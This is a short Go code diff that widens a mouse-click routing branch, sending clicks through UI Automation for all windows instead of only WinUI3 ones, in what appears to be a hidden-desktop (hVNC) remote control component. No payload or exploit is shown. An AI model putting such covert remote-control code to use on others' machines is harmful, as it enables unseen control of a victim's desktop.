@@ -1122,8 +1122,9 @@ func hvncMouseButtonOnThread(button int, down bool) error {
 		return nil
 	}
 
-	// WinUI3 branch: route through UIA patterns
-	if hvncUIAEnabled.Load() && isWinUI3Window(hitHwnd) {
+	// UIA branch: keep message-style clicks as the primary signal, but let
+	// UIA resolve complicated targets such as WinUI3/Explorer elements.
+	if hvncUIAEnabled.Load() {
 		return uiaHandleMouseButton(hitHwnd, pt, button, down)
 	}
 
